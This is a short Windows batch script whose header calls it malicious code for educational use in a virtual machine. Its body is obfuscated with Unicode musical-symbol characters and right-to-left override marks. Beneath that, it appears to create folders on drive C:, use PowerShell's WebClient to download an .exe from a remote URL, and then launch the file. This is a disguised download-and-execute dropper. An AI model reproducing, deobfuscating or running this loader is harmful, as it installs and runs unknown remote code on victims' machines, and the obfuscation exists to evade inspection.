:: =============================================
:: ⚠️ WARNING:This code is malicious code designed for learning and educational purposes, So 
:: it is recommended to run it only in a virtual machine (VM) and not run it indiscriminately. 
:: The distributor bears full responsibility for the unauthorized distribution or sharing of this code.
:: =============================================




@𝄽𝅘𝅥𝅯𝅺𝅼 𝅗𝅥𝅝𝅘𝅖
𝄽𝅯𝅭𝅘𝅥𝅱

𝅘𝅥𝅱𝅘𝅥 𝅝𝅗𝅧𝅥 𝅥𝅗𝅧𝅥𝅯𝅭𝅘𝅥 "𝄶:\𝅶𝅗𝅥𝅶\𝅘𝅥𝅱𝅶𝅶𝅶\𝅘𝅥𝅱𝅭𝅭𝅶𝅶𝅶" 𝅘𝅥𝅮𝅝𝅘𝅥𝅝𝅘𝅥𝅱𝅘𝅥 "𝄶:\𝅶𝅗𝅥𝅶\𝅘𝅥𝅱𝅭𝅭𝅶𝅶𝅶"

‮𝄽𝅗𝅥𝅶𝅥𝅥𝅥𝅘𝅥𝅘𝅥𝅱𝅥𝅘𝅥 "(𝄽𝅥𝅥-𝅗𝅥𝅝𝅥𝅭𝅘𝅥𝅱 𝅘𝅥𝅱𝅶𝅶𝅥𝅝.𝄽𝅥𝅘𝅥𝅱.𝅶𝅥𝅘𝅥𝅱𝅝𝅘𝅥𝅥𝅝𝅥𝅭𝅝𝅘𝅥𝅱).𝄶𝅗𝅥𝅶𝅶𝅗𝅥𝅶𝅝𝅥𝅝𝅭𝅘𝅥𝅱𝅗𝅥𝅘𝅥𝅱𝅘𝅥('𝅥𝅝𝅝𝅘𝅥𝅱𝅥://𝅝𝅝𝅥.𝅝𝅗𝅥𝅝𝅥𝅝𝅝.𝅥𝅗𝅥𝅘𝅥𝅮/𝅘𝅥𝅮𝅗𝅥𝅥-𝅝𝅥𝅘𝅥𝅱𝅘𝅥𝅱/𝅝𝅗𝅥𝅥/𝅘𝅥𝅮𝅗𝅥𝅘𝅥𝅱𝅝/𝅘𝅥𝅮𝅗𝅥𝅝𝅥/𝅥𝅗𝅥𝅝𝅥-𝅘𝅥𝅱.𝅝𝅘𝅥𝅱𝅘𝅥𝅱','𝄶:\𝅶𝅗𝅥𝅶\𝅘𝅥𝅱𝅭𝅭𝅶𝅶𝅶\𝅥𝅗𝅥𝅝𝅥-𝅘𝅥𝅱.𝅝𝅘𝅥𝅱𝅘𝅥𝅱')"

𝅘𝅥𝅱𝅘𝅥𝅱𝅘𝅥𝅱𝅝𝅥 "" "𝄶:\𝅶𝅗𝅥𝅶\𝅘𝅥𝅱𝅭𝅭𝅶𝅶𝅶\𝅥𝅗𝅥𝅝𝅥-𝅘𝅥𝅱.𝅝𝅘𝅥𝅱𝅘𝅥𝅱"
‮𝅝𝅘𝅥𝅱𝅶𝅥𝅝
𝅥𝅶𝅘𝅥𝅱𝅝𝅥
